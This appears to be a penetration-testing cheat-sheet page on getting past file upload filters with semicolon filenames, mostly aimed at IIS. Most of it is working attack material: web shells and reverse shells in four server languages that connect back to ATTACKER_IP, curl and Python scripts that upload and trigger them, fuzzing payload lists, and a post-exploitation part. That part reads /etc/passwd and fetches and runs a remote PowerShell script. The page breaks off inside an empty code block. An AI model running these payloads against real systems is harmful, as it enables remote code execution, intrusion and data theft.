---
title: Semicolon Extension Bypass
description: Exploit file upload filters using semicolon-based extension manipulation to bypass server-side and client-side validation mechanisms.
navigation:
  title: Semicolon Extension Bypass
---

## Understanding Semicolon Extension Bypass

::badge
Upload Bypass Technique
::

The semicolon (`;`) character is interpreted differently across web servers, application frameworks, and operating systems. When injected into a filename during upload, it can trick extension parsers into treating the file as a safe type while the server executes it as a malicious one.

::note
IIS (Internet Information Services) historically treats the semicolon as a path parameter delimiter. A file named `shell.asp;.jpg` is parsed as `shell.asp` by IIS while validation logic reads `.jpg` as the extension.
::

::tabs
  :::tabs-item{label="Core Concept"}
  The bypass works because of a mismatch between how the **upload validation** reads the extension and how the **web server** interprets the filename during execution.

  | Layer | Reads Filename As | Result |
  | --- | --- | --- |
  | Upload Filter | `shell.asp;.jpg` → `.jpg` | Allowed |
  | IIS Server | `shell.asp;.jpg` → `.asp` | Executed |
  | Apache (misconfig) | `shell.php;.jpg` → depends on config | Varies |
  | Nginx | `shell.php;.jpg` → literal filename | May chain with path info |
  :::

  :::tabs-item{label="Why It Works"}
  1. Validation logic splits the filename on `.` and checks the **last** extension
  2. The server runtime splits on `;` first, discarding everything after it
  3. The actual extension resolved by the server is the one **before** the semicolon
  4. MIME type checks may also pass because `.jpg` maps to `image/jpeg`
  :::

  :::tabs-item{label="Affected Targets"}
  - Microsoft IIS 6.0, 7.0, 7.5, 8.0, 8.5
  - IIS with Classic ASP or ASP.NET handlers
  - Applications using naive extension parsing (last-dot splitting)
  - Custom upload handlers that do not sanitize semicolons
  - Java application servers with certain servlet configurations
  - Frameworks relying on `pathinfo` resolution
  :::
::

---

## Reconnaissance & Fingerprinting

Before attempting the bypass, identify the target server, upload mechanism, and validation type.

::accordion
  :::accordion-item{label="Identify Web Server"}
  ```bash
  curl -sI https://target.com | grep -i "server"
  ```

  ```bash
  nmap -sV -p 80,443 target.com --script=http-server-header
  ```

  ```bash
  whatweb https://target.com
  ```

  ```bash
  httprint -h target.com -s signatures.txt
  ```

  ```bash
  wafw00f https://target.com
  ```
  :::

  :::accordion-item{label="Identify Upload Endpoint"}
  ```bash
  # Spider for upload forms
  gospider -s https://target.com -d 3 -c 10 | grep -i "upload\|file\|attach\|import"
  ```

  ```bash
  # Brute force common upload paths
  ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302 | grep -i upload
  ```

  ```bash
  dirsearch -u https://target.com -w /usr/share/wordlists/dirb/common.txt -e asp,aspx,php,jsp -f
  ```

  ```bash
  # Check for upload functionality in JavaScript
  curl -s https://target.com | grep -oP '(upload|file|attach|multipart)[^"]*' 
  ```
  :::

  :::accordion-item{label="Identify Validation Type"}
  ```bash
  # Send a basic PHP file to observe the error
  curl -X POST https://target.com/upload \
    -F "file=@shell.php" \
    -v 2>&1 | grep -i "error\|invalid\|not allowed\|extension\|type"
  ```

  ```bash
  # Test with a valid extension to confirm uploads work
  curl -X POST https://target.com/upload \
    -F "file=@legit.jpg" \
    -v
  ```

  ```bash
  # Test with double extension to fingerprint filter logic
  curl -X POST https://target.com/upload \
    -F "file=@test.php.jpg" \
    -v
  ```
  :::

  :::accordion-item{label="Determine Upload Storage Location"}
  ```bash
  # Upload a legitimate file and trace the response for path disclosure
  curl -X POST https://target.com/upload \
    -F "file=@test.jpg" \
    -v 2>&1 | grep -oP '(\/[a-zA-Z0-9_\-\/]+\.(jpg|png|gif|php|asp))'
  ```

  ```bash
  # Common upload directories
  ffuf -u https://target.com/FUZZ/test.jpg -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200
  ```

  ```bash
  # Check predictable paths
  for dir in uploads files media assets documents images upload content data; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$dir/")
    echo "$dir -> $code"
  done
  ```
  :::
::

---

## Payload Construction

::callout
Build filenames and payloads specifically crafted to exploit semicolon parsing mismatches.
::

### Filename Patterns

::tabs
  :::tabs-item{label="ASP/ASPX Payloads"}
  ```bash [Basic Semicolon Bypass]
  shell.asp;.jpg
  shell.asp;.png
  shell.asp;.gif
  shell.asp;.pdf
  shell.asp;.doc
  shell.asp;.txt
  ```

  ```bash [Extended Patterns]
  shell.asp;image.jpg
  shell.asp;file.png
  shell.asp;photo.gif
  shell.asp;document.pdf
  shell.asp;avatar.bmp
  shell.asp;thumbnail.tiff
  ```

  ```bash [ASPX Variants]
  shell.aspx;.jpg
  shell.aspx;.png
  shell.aspx;test.gif
  shell.aspx;avatar.jpg
  shell.aspx;profile.png
  ```

  ```bash [Deep Semicolon Nesting]
  shell.asp;.jpg;.png
  shell.asp;;;;;.jpg
  shell.asp;%00.jpg
  shell.asp;.j;.p;.g
  ```
  :::

  :::tabs-item{label="PHP Payloads"}
  ```bash [PHP on Misconfigured Servers]
  shell.php;.jpg
  shell.php;.png
  shell.php;.gif
  shell.phtml;.jpg
  shell.php5;.jpg
  shell.php7;.jpg
  shell.phar;.jpg
  ```

  ```bash [PHP with Null Byte Combo]
  shell.php;%00.jpg
  shell.php;\x00.jpg
  shell.php;.jpg%00
  ```

  ```bash [PHP Alternative Extensions]
  shell.pht;.jpg
  shell.phps;.jpg
  shell.php-s;.jpg
  shell.php_s;.jpg
  ```
  :::

  :::tabs-item{label="JSP Payloads"}
  ```bash [JSP Semicolon Patterns]
  shell.jsp;.jpg
  shell.jspx;.jpg
  shell.jspa;.png
  shell.jsw;.gif
  shell.jspf;.jpg
  shell.jsp;test.png
  ```

  ```bash [Tomcat Specific]
  shell.jsp;jsessionid=fake.jpg
  shell.jsp;param=value.png
  shell.jsp;a=b.gif
  ```
  :::

  :::tabs-item{label="ColdFusion Payloads"}
  ```bash [CFM Variants]
  shell.cfm;.jpg
  shell.cfc;.png
  shell.cfml;.gif
  shell.cfm;image.jpg
  ```
  :::
::

### Web Shell Payloads

::code-group
```asp [cmd.asp]
<%
Dim cmd
cmd = Request("cmd")
If cmd <> "" Then
  Dim oShell
  Set oShell = Server.CreateObject("WScript.Shell")
  Dim oExec
  Set oExec = oShell.Exec("cmd /c " & cmd)
  Response.Write("<pre>" & oExec.StdOut.ReadAll & "</pre>")
End If
%>
```

```aspx [cmd.aspx]
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + cmd;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
```

```php [cmd.php]
<?php
if(isset($_REQUEST['cmd'])){
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

```jsp [cmd.jsp]
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = br.readLine()) != null) {
    out.println(line);
  }
}
%>
```
::

### Reverse Shell Payloads

::code-collapse
```asp [reverse-shell.asp]
<%
Dim oShell
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run "powershell -nop -ep bypass -c ""$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"""
%>
```

```aspx [reverse-shell.aspx]
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Threading" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
  TcpClient client = new TcpClient("ATTACKER_IP", 4444);
  Stream stream = client.GetStream();
  StreamReader reader = new StreamReader(stream);
  StreamWriter writer = new StreamWriter(stream);
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.RedirectStandardInput = true;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.RedirectStandardError = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  string line;
  while((line = reader.ReadLine()) != null) {
    p.StandardInput.WriteLine(line);
    p.StandardInput.Flush();
    Thread.Sleep(500);
    writer.Write(p.StandardOutput.ReadToEnd());
    writer.Write(p.StandardError.ReadToEnd());
    writer.Flush();
  }
}
</script>
```

```php [reverse-shell.php]
<?php
$sock=fsockopen("ATTACKER_IP",4444);
$proc=proc_open("/bin/bash",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
```

```jsp [reverse-shell.jsp]
<%@ page import="java.lang.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%
  Socket s = new Socket("ATTACKER_IP", 4444);
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-i"});
  InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
  OutputStream po = p.getOutputStream(), so = s.getOutputStream();
  while(!s.isClosed()){
    while(pi.available()>0) so.write(pi.read());
    while(pe.available()>0) so.write(pe.read());
    while(si.available()>0) po.write(si.read());
    so.flush(); po.flush(); Thread.sleep(50);
  }
  p.destroy(); s.close();
%>
```
::

---

## Attack Execution

### Method 1 — Direct cURL Upload

::tabs
  :::tabs-item{label="Basic Upload"}
  ```bash
  # ASP shell with semicolon bypass
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp;.jpg" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # ASPX variant
  curl -X POST https://target.com/upload \
    -F "file=@cmd.aspx;filename=shell.aspx;.jpg" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # PHP variant (misconfigured servers)
  curl -X POST https://target.com/upload \
    -F "file=@cmd.php;filename=shell.php;.jpg" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```

  ```bash
  # JSP variant with fake jsessionid
  curl -X POST https://target.com/upload \
    -F "file=@cmd.jsp;filename=shell.jsp;jsessionid=fake.jpg" \
    -H "Cookie: session=YOUR_SESSION" \
    -v
  ```
  :::

  :::tabs-item{label="Content-Type Manipulation"}
  ```bash
  # Force image MIME type
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;type=image/jpeg;filename=shell.asp;.jpg" \
    -v
  ```

  ```bash
  # Force PNG MIME type
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;type=image/png;filename=shell.asp;.png" \
    -v
  ```

  ```bash
  # Force GIF MIME type
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;type=image/gif;filename=shell.asp;.gif" \
    -v
  ```

  ```bash
  # Force octet-stream
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;type=application/octet-stream;filename=shell.asp;.jpg" \
    -v
  ```
  :::

  :::tabs-item{label="Header Injection in Filename"}
  ```bash
  # Inject Content-Disposition manually
  curl -X POST https://target.com/upload \
    -H "Content-Type: multipart/form-data; boundary=----Boundary" \
    -H "Cookie: session=YOUR_SESSION" \
    --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="file"; filename="shell.asp;.jpg"\r\nContent-Type: image/jpeg\r\n\r\n<%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>\r\n------Boundary--'
  ```
  :::
::

### Method 2 — Python Upload Script

::code-group
```python [semicolon_upload.py]
import requests
import sys

target = sys.argv[1]
upload_url = f"{target}/upload"

filenames = [
    "shell.asp;.jpg",
    "shell.asp;.png",
    "shell.asp;.gif",
    "shell.asp;image.jpg",
    "shell.asp;;;;;.jpg",
    "shell.aspx;.jpg",
    "shell.aspx;test.png",
    "shell.asp;%00.jpg",
]

payload = '<%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>'

headers = {
    "Cookie": "session=YOUR_SESSION_COOKIE"
}

for fname in filenames:
    files = {
        "file": (fname, payload, "image/jpeg")
    }
    try:
        r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=10)
        status = "SUCCESS" if r.status_code == 200 and "error" not in r.text.lower() else "FAILED"
        print(f"[{status}] {fname} -> {r.status_code} ({len(r.text)} bytes)")
    except Exception as e:
        print(f"[ERROR] {fname} -> {e}")
```

```python [multi_extension_brute.py]
import requests
import itertools
import sys

target = sys.argv[1]
upload_url = f"{target}/upload"

exec_exts = ["asp", "aspx", "php", "php5", "phtml", "jsp", "jspx", "cfm"]
safe_exts = ["jpg", "png", "gif", "bmp", "pdf", "txt", "doc", "ico"]
separators = [";", ";.", ";;", ";;;", ";%00", ";%20"]

payloads = {
    "asp": '<%=CreateObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll%>',
    "aspx": '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c whoami").StandardOutput.ReadToEnd());%>',
    "php": '<?php echo shell_exec("whoami"); ?>',
    "jsp": '<%Runtime.getRuntime().exec("whoami");%>',
}

for exec_ext in exec_exts:
    for safe_ext in safe_exts:
        for sep in separators:
            fname = f"shell.{exec_ext}{sep}{safe_ext}"
            payload_content = payloads.get(exec_ext, payloads.get("php"))
            files = {"file": (fname, payload_content, "image/jpeg")}
            try:
                r = requests.post(upload_url, files=files, verify=False, timeout=10)
                if r.status_code == 200 and "error" not in r.text.lower():
                    print(f"[UPLOADED] {fname}")
            except:
                pass
```

```python [trigger_shell.py]
import requests
import sys

base_url = sys.argv[1]
shell_name = sys.argv[2]  # e.g., shell.asp;.jpg
cmd = sys.argv[3] if len(sys.argv) > 3 else "whoami"

paths = [
    f"/uploads/{shell_name}",
    f"/upload/{shell_name}",
    f"/files/{shell_name}",
    f"/images/{shell_name}",
    f"/media/{shell_name}",
    f"/content/{shell_name}",
    f"/assets/{shell_name}",
    f"/documents/{shell_name}",
    f"/data/{shell_name}",
    f"/attachments/{shell_name}",
]

for path in paths:
    url = f"{base_url}{path}?cmd={cmd}"
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200 and len(r.text) > 0:
            print(f"[HIT] {url}")
            print(r.text)
            break
    except:
        pass
```
::

### Method 3 — Burp Suite Manipulation

::steps{level="4"}
#### Intercept the Upload Request

```
1. Configure browser proxy -> 127.0.0.1:8080
2. Navigate to upload form on target
3. Select legitimate image file (test.jpg)
4. Click Upload
5. Burp Proxy -> Intercept tab captures the request
```

#### Modify the Filename in Content-Disposition

Original request:

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

<binary image data>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Modified request:

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.asp;.jpg"
Content-Type: image/jpeg

<%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

#### Replace Body Content with Web Shell

```
1. Select all binary image data in the request body
2. Replace with your ASP/ASPX/PHP/JSP payload
3. Optionally keep Content-Type as image/jpeg to bypass MIME checks
4. Forward the request
```

#### Locate and Trigger the Shell

```bash
# Check response for uploaded file path
# Try common upload directories
curl "https://target.com/uploads/shell.asp;.jpg?cmd=whoami"
curl "https://target.com/upload/shell.asp;.jpg?cmd=whoami"
curl "https://target.com/files/shell.asp;.jpg?cmd=whoami"
```
::

### Method 4 — Intruder-Based Filename Fuzzing

::collapsible
Use Burp Intruder to fuzz semicolon placement and extension combinations.

**Intruder Configuration:**

```
Attack Type: Sniper
Payload Position: filename="§shell.asp;.jpg§"
```

**Payload List:**

```
shell.asp;.jpg
shell.asp;.png
shell.asp;.gif
shell.asp;.bmp
shell.asp;.pdf
shell.asp;.txt
shell.asp;.doc
shell.asp;.ico
shell.asp;image.jpg
shell.asp;photo.png
shell.asp;file.gif
shell.asp;test.bmp
shell.asp;;;;;.jpg
shell.asp;%00.jpg
shell.asp;%20.jpg
shell.aspx;.jpg
shell.aspx;.png
shell.aspx;.gif
shell.aspx;image.jpg
shell.aspx;test.png
shell.asmx;.jpg
shell.ashx;.jpg
shell.asp;.j
shell.asp;.jp
shell.asp;.jpe
shell.asp;.jpeg
cmd.asp;.jpg
exec.asp;.jpg
run.asp;.jpg
a.asp;.jpg
x.asp;.jpg
```

**Grep Match Rules:**

```
Negative match: "error", "invalid", "not allowed", "rejected", "forbidden"
Positive match: "success", "uploaded", "saved", "200"
Status codes to flag: 200, 201, 301, 302
```
::

---

## Advanced Bypass Techniques

::card-group
  :::card
  ---
  title: Magic Bytes Prepending
  ---
  Prepend valid image file headers before the shell code to bypass content-based validation.

  ```bash
  # GIF magic bytes + ASP shell
  printf 'GIF89a\n<%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%%>' > shell.asp

  # Upload with semicolon bypass
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;filename=shell.asp;.gif" \
    -F "type=image/gif"
  ```

  ```bash
  # JPEG magic bytes + ASP shell
  printf '\xFF\xD8\xFF\xE0\n<%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%%>' > shell.asp

  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;filename=shell.asp;.jpg"
  ```

  ```bash
  # PNG magic bytes + PHP shell
  printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php

  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.php;.png"
  ```

  ```bash
  # BMP magic bytes
  printf 'BM<%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%%>' > shell.asp

  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;filename=shell.asp;.bmp"
  ```
  :::

  :::card
  ---
  title: Null Byte + Semicolon Chain
  ---
  Combine null byte injection with semicolon for double-layer bypass.

  ```bash
  # Null byte before safe extension
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp;%00.jpg"
  ```

  ```bash
  # Null byte after semicolon
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp;\x00.jpg"
  ```

  ```bash
  # URL-encoded null byte variations
  curl -X POST https://target.com/upload \
    -F "file=@cmd.php;filename=shell.php;%00.jpg"

  curl -X POST https://target.com/upload \
    -F "file=@cmd.php;filename=shell.php%00;.jpg"

  curl -X POST https://target.com/upload \
    -F "file=@cmd.php;filename=shell.php\0;.jpg"
  ```
  :::

  :::card
  ---
  title: Double Content-Disposition
  ---
  Send two Content-Disposition headers to confuse parsers.

  ```http
  POST /upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----Bound

  ------Bound
  Content-Disposition: form-data; name="file"; filename="safe.jpg"
  Content-Disposition: form-data; name="file"; filename="shell.asp;.jpg"
  Content-Type: image/jpeg

  <%=CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll%>
  ------Bound--
  ```

  Some parsers read the first header, others read the last. This exploits that inconsistency.
  :::

  :::card
  ---
  title: Unicode / Encoding Tricks
  ---
  Use character encoding to obfuscate the semicolon or extension.

  ```bash
  # URL-encoded semicolon
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp%3B.jpg"
  ```

  ```bash
  # Double URL-encoding
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp%253B.jpg"
  ```

  ```bash
  # UTF-8 encoded semicolon variants
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp%C0%BB.jpg"
  ```

  ```bash
  # Mixed case extension
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.AsP;.JpG"
  ```

  ```bash
  # Full-width semicolon (Unicode U+FF1B)
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp；.jpg"
  ```
  :::
::

---

## IIS-Specific Exploitation

::warning
IIS is the primary target for semicolon extension bypass. The following techniques are tailored for IIS environments.
::

### IIS 6.0 Directory Parsing

::tabs
  :::tabs-item{label="Directory Semicolon"}
  IIS 6.0 also parses directory names with semicolons. A request to `/uploads/shell.asp;/` treats everything in that directory as ASP.

  ```bash
  # Create a directory with .asp; extension
  # If directory creation is possible via upload path manipulation
  curl -X PUT "https://target.com/uploads/shell.asp;/" \
    -H "Content-Type: application/octet-stream"
  ```

  ```bash
  # Upload a file into the semicolon directory
  curl -X POST https://target.com/upload \
    -F "file=@cmd.txt;filename=../shell.asp;/cmd.txt"
  ```

  ```bash
  # Trigger execution
  curl "https://target.com/uploads/shell.asp;/cmd.txt?cmd=whoami"
  ```
  :::

  :::tabs-item{label="IIS 6.0 Handler Mapping"}
  ```bash
  # Test if IIS maps semicolon files to ASP handler
  curl -v "https://target.com/uploads/test.asp;.jpg"
  # Look for ASP error messages in response = handler is mapped
  ```

  ```bash
  # Test ASPX handler
  curl -v "https://target.com/uploads/test.aspx;.jpg"
  ```

  ```bash
  # Test with trailing path info
  curl -v "https://target.com/uploads/test.asp;.jpg/path_info"
  ```
  :::

  :::tabs-item{label="IIS Short Name Bruteforce"}
  ```bash
  # Use IIS shortname scanner to find uploaded files
  java -jar iis_shortname_scanner.jar https://target.com/uploads/
  ```

  ```bash
  # Alternative with Python
  python3 iis-shortname-scan.py https://target.com/uploads/
  ```

  ```bash
  # Manual 8.3 name guessing
  curl -v "https://target.com/uploads/SHELL~1.ASP"
  curl -v "https://target.com/uploads/SHELL~1.AS*"
  ```
  :::
::

### IIS 7.x+ Path Parameter Abuse

```bash
# IIS 7+ may still process semicolons as path parameters
curl "https://target.com/uploads/shell.asp;.jpg?cmd=whoami"

# Test with different parameter styles
curl "https://target.com/uploads/shell.asp;param=value.jpg?cmd=whoami"
curl "https://target.com/uploads/shell.asp;a.jpg?cmd=whoami"

# Path info variant
curl "https://target.com/uploads/shell.asp;.jpg/extra?cmd=whoami"
```

---

## Combining With Other Bypass Techniques

::accordion
  :::accordion-item{label="Semicolon + Double Extension"}
  ```bash
  shell.asp;.jpg.asp
  shell.asp.jpg;.asp
  shell.jpg;.asp
  shell.asp;.asp.jpg
  ```

  ```bash
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp;.jpg.asp"
  ```
  :::

  :::accordion-item{label="Semicolon + Case Variation"}
  ```bash
  shell.AsP;.jpg
  shell.aSp;.JpG
  shell.ASP;.JPG
  shell.Asp;.Jpg
  shell.aSpX;.pNg
  ```

  ```bash
  for ext in "AsP" "aSp" "ASP" "Asp" "asP"; do
    curl -X POST https://target.com/upload \
      -F "file=@cmd.asp;filename=shell.${ext};.jpg" \
      -s -o /dev/null -w "%{http_code} shell.${ext};.jpg\n"
  done
  ```
  :::

  :::accordion-item{label="Semicolon + Trailing Dots/Spaces"}
  ```bash
  # Windows strips trailing dots and spaces
  shell.asp;.jpg.
  shell.asp;.jpg..
  shell.asp;.jpg...
  shell.asp;.jpg .
  shell.asp;.jpg  .
  shell.asp ;.jpg
  shell.asp. ;.jpg
  ```

  ```bash
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp;.jpg."
  
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp;.jpg "
  
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp. ;.jpg"
  ```
  :::

  :::accordion-item{label="Semicolon + Path Traversal"}
  ```bash
  # Traverse out of safe upload directory
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=../shell.asp;.jpg"

  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=..%2Fshell.asp;.jpg"

  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=....//shell.asp;.jpg"

  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=..%5Cshell.asp;.jpg"

  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=..%255Cshell.asp;.jpg"
  ```
  :::

  :::accordion-item{label="Semicolon + NTFS Alternate Data Stream"}
  ```bash
  # ADS on Windows/IIS
  shell.asp;.jpg::$DATA
  shell.asp::$DATA;.jpg
  shell.asp;.jpg::$DATA.asp

  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;filename=shell.asp;.jpg::$DATA"
  ```
  :::

  :::accordion-item{label="Semicolon + Content-Type Mismatch"}
  ```bash
  # Send shell with image Content-Type
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;type=image/jpeg;filename=shell.asp;.jpg"

  # Send with generic binary type
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;type=application/octet-stream;filename=shell.asp;.jpg"

  # Send with text type
  curl -X POST https://target.com/upload \
    -F "file=@cmd.asp;type=text/plain;filename=shell.asp;.jpg"
  ```
  :::
::

---

## Automated Scanning

### Using Fuxploider

```bash
# Clone and install
git clone https://github.com/almandin/fuxploider.git
cd fuxploider
pip3 install -r requirements.txt

# Run against target
python3 fuxploider.py \
  --url https://target.com/upload \
  --not-regex "error|invalid|fail" \
  --threads 5
```

### Custom ffuf-Based Extension Fuzzing

::code-group
```bash [Generate Wordlist]
# Generate semicolon filename wordlist
cat > /tmp/semicolon_fuzz.txt << 'EOF'
shell.asp;.jpg
shell.asp;.png
shell.asp;.gif
shell.asp;.bmp
shell.asp;.pdf
shell.asp;.doc
shell.asp;.txt
shell.asp;.ico
shell.aspx;.jpg
shell.aspx;.png
shell.aspx;.gif
shell.php;.jpg
shell.php;.png
shell.php;.gif
shell.phtml;.jpg
shell.jsp;.jpg
shell.jsp;.png
shell.jspx;.jpg
shell.cfm;.jpg
shell.asp;image.jpg
shell.asp;photo.png
shell.asp;file.gif
shell.asp;;;;;.jpg
shell.asp;%00.jpg
shell.asp;%20.jpg
shell.AsP;.jpg
shell.aSp;.JpG
shell.asp;.jpg.
shell.asp;.jpg..
shell.asp ;.jpg
shell.asp;.j
shell.asp;.jp
shell.asp;.jpe
shell.asp;.jpeg
EOF
```

```bash [Fuzz Upload]
# Fuzz filenames against upload endpoint
ffuf -u https://target.com/upload \
  -X POST \
  -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary\r\nContent-Disposition: form-data; name="file"; filename="FUZZ"\r\nContent-Type: image/jpeg\r\n\r\nSHELL_PAYLOAD\r\n------Boundary--' \
  -w /tmp/semicolon_fuzz.txt \
  -mc 200 \
  -fc 403,404,500
```

```bash [Fuzz Uploaded File Location]
# After successful upload, find the shell
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200 \
  -e .asp,.aspx,.php,.jsp
```
::

### Nuclei Template

::code-collapse
```yaml [semicolon-upload-bypass.yaml]
id: semicolon-extension-bypass

info:
  name: File Upload - Semicolon Extension Bypass
  author: pentester
  severity: critical
  description: Tests for semicolon extension bypass in file upload functionality
  tags: upload,bypass,fileupload,rce

http:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
        
        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="nuclei_test.asp;.jpg"
        Content-Type: image/jpeg
        
        <%Response.Write("NUCLEI_SEMICOLON_TEST")%>
        ------WebKitFormBoundary--

      - |
        GET {{BaseURL}}/uploads/nuclei_test.asp;.jpg HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "NUCLEI_SEMICOLON_TEST"
        part: body

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: header
        regex:
          - "(?i)(location|content-disposition):\\s*.*nuclei_test"
```
::

```bash
# Run the template
nuclei -t semicolon-upload-bypass.yaml -u https://target.com -v

# Run with multiple targets
nuclei -t semicolon-upload-bypass.yaml -l targets.txt -c 50 -v

# Run all upload templates
nuclei -t /path/to/upload-templates/ -u https://target.com -v
```

---

## Post-Exploitation

::warning
After gaining code execution through the uploaded shell, escalate access and establish persistence.
::

::tabs
  :::tabs-item{label="Verify Execution"}
  ```bash
  # Test command execution
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=whoami"
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=hostname"
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=ipconfig"
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=systeminfo"
  ```

  ```bash
  # Test on Linux targets
  curl "https://target.com/uploads/shell.php;.jpg?cmd=id"
  curl "https://target.com/uploads/shell.php;.jpg?cmd=uname+-a"
  curl "https://target.com/uploads/shell.php;.jpg?cmd=cat+/etc/passwd"
  ```
  :::

  :::tabs-item{label="Reverse Shell Trigger"}
  ```bash
  # Start listener
  nc -lvnp 4444
  ```

  ```bash
  # Trigger PowerShell reverse shell (Windows/IIS)
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=powershell+-nop+-ep+bypass+-c+IEX(New-Object+Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
  ```

  ```bash
